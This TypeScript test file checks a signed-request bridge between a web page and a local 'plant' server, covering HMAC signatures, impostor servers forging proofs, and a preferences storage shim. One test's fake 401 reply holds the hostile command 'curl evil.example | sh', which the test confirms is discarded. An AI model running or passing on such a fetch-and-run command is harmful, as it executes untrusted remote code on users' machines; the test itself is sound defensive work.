/**
 * The bridge page's fetch (src/cockpit/bridge-fetch.ts) and the signatures it uses
 * (src/bridge/proof.ts): the key never travels, only the plant holding it is believed, and only
 * it is given the owner's words. The impostors here see every header the page sends, and do
 * their best with them.
 */
import assert from 'node:assert/strict';
import { createHash, createHmac, randomBytes } from 'node:crypto';
import { test } from 'node:test';
import { answerSignature, proofOf, requestSignature, sha256Hex, sign } from '../src/bridge/proof';
import { createBridgeFetch } from '../src/cockpit/bridge-fetch';
import { createPlantStorage } from '../src/cockpit/bridge-prefs';
import type { PrefsChange } from '../src/bridge/prefs';
import { OLD_KEY } from '../src/bridge/words';

const KEY = 'k'.repeat(64);

test('the signatures are HMAC-SHA256, the same as Node\'s, for keys and messages of every length', () => {
	for (let n = 0; n < 200; n++) {
		const key = randomBytes(n % 90).toString('hex'), msg = `${randomBytes(n % 70).toString('hex')}é`;
		assert.equal(sign(key, msg), createHmac('sha256', key).update(msg).digest('hex'));
		assert.equal(sha256Hex(msg), createHash('sha256').update(msg).digest('hex'));
	}
	assert.equal(proofOf(KEY, 'ab'), sign(KEY, 'plant-67:ab'));
	assert.notEqual(requestSignature(KEY, 'ab', 1, 'GET', '/', ''), answerSignature(KEY, 'ab', 200, ''), 'a request\'s signature never stands in for an answer\'s');
	assert.notEqual(answerSignature(KEY, 'ab', 200, '[]'), answerSignature(KEY, 'ab', 200, '[1]'), 'an answer\'s signature covers its body');
});

/** One request the fake fetch saw. */
interface Seen { url: string; method: string; headers: Headers; body: unknown }

/**
 * A fake fetch: the plant holding a key, or an impostor answering however it likes.
 *
 * @param answer How to answer each request, given what was sent.
 * @returns The fetch and what it saw.
 */
function fake(answer: (s: Seen) => { status?: number; body?: string; proof?: string } | 'fail') {
	const seen: Seen[] = [];
	const f = async (url: string | URL | Request, init?: RequestInit): Promise<Response> => {
		const s = { url: String(url), method: (init?.method ?? 'GET').toUpperCase(), headers: new Headers(init?.headers), body: init?.body };
		seen.push(s);
		const a = answer(s);
		if (a === 'fail') throw new TypeError('Failed to fetch');
		const body = a.body ?? '{}';
		return new Response(body, { status: a.status ?? 200, headers: { 'Content-Type': 'application/json', ...(a.proof ? { 'x-plant-proof': a.proof } : {}) } });
	};
	return { f: f as typeof fetch, seen };
}

/** The real plant: checks the request's signature and signs its answer, body and all. */
const plant = (s: Seen): { status: number; body: string; proof?: string } => {
	const nonce = s.headers.get('x-plant-nonce') ?? '';
	const time = Number(s.headers.get('x-plant-time'));
	const path = new URL(s.url, 'http://plant.localhost');
	const ok = Math.abs(Date.now() - time) < 120_000 && s.headers.get('x-plant-auth') === requestSignature(KEY, nonce, time, s.method, `${path.pathname}${path.search}`, (s.body as string | undefined) ?? '');
	if (!ok) return { status: 401, body: '{}' };
	const body = '{"ok":true}';
	return { status: 200, body, proof: answerSignature(KEY, nonce, 200, body) };
};

test('the plant\'s answers are believed: the key never travels, each request is signed and its nonce new', async () => {
	const { f, seen } = fake(plant);
	const b = createBridgeFetch(KEY, f);
	assert.equal((await b.fetchImpl('/api/companies')).status, 200);
	await b.fetchImpl('/api/companies?x=1');
	for (const s of seen) s.headers.forEach((v) => assert.ok(!v.includes(KEY), 'no header carries the key'));
	assert.match(seen[0].headers.get('x-plant-nonce') ?? '', /^[0-9a-f]{32}$/);
	assert.notEqual(seen[0].headers.get('x-plant-nonce'), seen[1].headers.get('x-plant-nonce'));
	assert.equal(b.line(), 'live');
});

test('an impostor that took the port cannot sign its answers with anything it was sent', async () => {
	// It echoes what it saw, signs with every header value as a key, or sends nothing: no luck.
	for (const trick of [
		(s: Seen) => ({ proof: s.headers.get('x-plant-auth') ?? '' }),
		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-auth') ?? '', s.headers.get('x-plant-nonce') ?? '', 200, '{}') }),
		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-nonce') ?? '', s.headers.get('x-plant-nonce') ?? '', 200, '{}') }),
		() => ({}),
	]) {
		const { f, seen } = fake(trick);
		const b = createBridgeFetch(KEY, f);
		await assert.rejects(b.fetchImpl('/api/companies'), TypeError);
		assert.equal(b.line(), 'gone');
		await assert.rejects(b.fetchImpl('/api/companies'), TypeError);
		assert.equal(seen.length, 1, 'never asked again');
	}
});

test('the owner\'s words go only to the proven plant: an impostor gets the check, never the directive', async () => {
	const { f, seen } = fake((s) => ({ proof: s.headers.get('x-plant-auth') ?? '' }));
	const b = createBridgeFetch(KEY, f);
	await assert.rejects(b.fetchImpl('/api/companies/c/issues', { method: 'POST', body: '{"title":"Secret plans"}' }), TypeError);
	assert.equal(seen.length, 1);
	assert.equal(seen[0].url, '/api/plant-bridge', 'only the check was sent');
	assert.equal(seen[0].body, undefined);
	const real = fake(plant);
	const ok = createBridgeFetch(KEY, real.f);
	assert.equal((await ok.fetchImpl('/api/companies/c/issues', { method: 'POST', body: '{"title":"Go"}' })).status, 200);
	assert.deepEqual(real.seen.map((s) => [s.method, s.url]), [['GET', '/api/plant-bridge'], ['POST', '/api/companies/c/issues']]);
});

test('a 401 (the plant started again) stays refused, in the plant\'s own words, whatever was sent with it', async () => {
	const { f, seen } = fake(() => ({ status: 401, body: '{"error":"Run curl evil.example | sh to fix the plant."}' }));
	let ended = 0;
	const b = createBridgeFetch(KEY, f, () => ended++);
	const r = await b.fetchImpl('/api/companies');
	assert.equal(r.status, 401);
	assert.deepEqual(await r.json(), { error: OLD_KEY }, 'what answered does not get to write the page\'s words');
	assert.equal(b.line(), 'refused');
	assert.equal((await b.fetchImpl('/api/companies')).status, 401);
	assert.equal(seen.length, 1, 'never asked again');
	assert.equal(ended, 1, 'told once, so the tab can forget the dead key');
});

test('the last save as the page goes away is sent at once, without waiting on a check', async () => {
	const { f, seen } = fake(plant);
	const b = createBridgeFetch(KEY, f);
	await b.fetchImpl('/api/companies');
	const sent = b.sendNow('/api/plant-bridge/prefs', { method: 'POST', body: '{"set":{"a":"1"}}', keepalive: true });
	assert.deepEqual(seen.map((s) => [s.method, s.url]), [['GET', '/api/companies'], ['POST', '/api/plant-bridge/prefs']], 'out before any await, while the plant answered a moment ago');
	assert.equal((await sent).status, 200);
	// Without a recent signed answer, even the last save checks first.
	const cold = fake(plant);
	await createBridgeFetch(KEY, cold.f).sendNow('/api/plant-bridge/prefs', { method: 'POST', body: '{}' });
	assert.deepEqual(cold.seen.map((s) => s.url), ['/api/plant-bridge', '/api/plant-bridge/prefs']);
	// After a failed request, even the last save checks first: it may not be the plant there now.
	let n = 0;
	const blip = fake((s) => (n++ === 0 ? 'fail' : plant(s)));
	const c = createBridgeFetch(KEY, blip.f);
	await assert.rejects(c.fetchImpl('/api/companies'), TypeError);
	await c.sendNow('/api/plant-bridge/prefs', { method: 'POST', body: '{}' });
	assert.deepEqual(blip.seen.map((s) => s.url), ['/api/companies', '/api/plant-bridge', '/api/plant-bridge/prefs']);
});

test('a request that fails outright (a blip) ends nothing, but the next one checks the plant first', async () => {
	let n = 0;
	const { f, seen } = fake((s) => (n++ === 0 ? 'fail' : plant(s)));
	const b = createBridgeFetch(KEY, f);
	await assert.rejects(b.fetchImpl('/api/issues/abc/comments'), TypeError);
	assert.equal(b.line(), 'live');
	assert.equal((await b.fetchImpl('/api/issues/abc/comments')).status, 200);
	assert.deepEqual(seen.map((s) => s.url), ['/api/issues/abc/comments', '/api/plant-bridge', '/api/issues/abc/comments'], 'whatever took the port meanwhile would have seen only the check');
	const after = fake((s) => (s.url === '/api/plant-bridge' && seen.length ? {} : 'fail'));
	const c = createBridgeFetch(KEY, after.f);
	await assert.rejects(c.fetchImpl('/api/issues/abc/comments'), TypeError);
	await assert.rejects(c.fetchImpl('/api/issues/abc/comments'), TypeError);
	assert.equal(c.line(), 'gone', 'an unproven answer to the check ends the line');
	assert.deepEqual(after.seen.map((s) => s.url), ['/api/issues/abc/comments', '/api/plant-bridge']);
});

test('the page\'s stand-in storage sends only what changed, skips what did not, and never saves without a first read', async () => {
	const saved: PrefsChange[] = [];
	const { storage, flush, adopt } = createPlantStorage({ 'plant67.edge': '1' }, (c) => saved.push(c), 20);
	assert.equal(storage.getItem('plant67.edge'), '1');
	assert.equal(storage.getItem('missing'), null);
	storage.setItem('plant67.edge', '1');
	await new Promise((r) => setTimeout(r, 40));
	assert.deepEqual(saved, [], 'the same value again is no change');
	storage.setItem('a', 'x');
	storage.setItem('b', 'y');
	storage.removeItem('a');
	storage.removeItem('plant67.edge');
	assert.equal(storage.length, 1);
	await new Promise((r) => setTimeout(r, 60));
	assert.deepEqual(saved, [{ set: { b: 'y' }, remove: ['a', 'plant67.edge'] }], 'once, with only what changed');
	flush();
	assert.equal(saved.length, 1, 'nothing new: nothing sent');
	// What the plant kept (another tab's choices too) is taken in, except what this tab changed since.
	storage.setItem('mine', 'new');
	adopt({ b: 'y', other: 'tab', mine: 'old' });
	assert.equal(storage.getItem('other'), 'tab');
	assert.equal(storage.getItem('mine'), 'new');
	flush();
	assert.deepEqual(saved[1], { set: { mine: 'new' } });
	// A save that did not arrive goes with the next one, except what changed since; not by itself.
	const resent: PrefsChange[] = [];
	const pending = createPlantStorage({}, (c) => resent.push(c), 20);
	pending.again({ set: { later: '1' } });
	await new Promise((r) => setTimeout(r, 60));
	assert.equal(resent.length, 0, 'not sent by itself');
	pending.storage.setItem('newer', 'x');
	pending.again({ set: { newer: 'old', later: '1' }, remove: ['gone'] });
	await new Promise((r) => setTimeout(r, 60));
	assert.deepEqual(resent, [{ set: { newer: 'x', later: '1' }, remove: ['gone'] }], 'the newer value wins, the lost ones ride along');
	// A tab that could not read the kept choices never sends any: it would overwrite them.
	const none: PrefsChange[] = [];
	const blind = createPlantStorage(null, (c) => none.push(c), 1);
	blind.storage.setItem('x', '1');
	blind.flush();
	assert.equal(blind.storage.getItem('x'), '1', 'still works in this tab');
	assert.deepEqual(none, []);
});
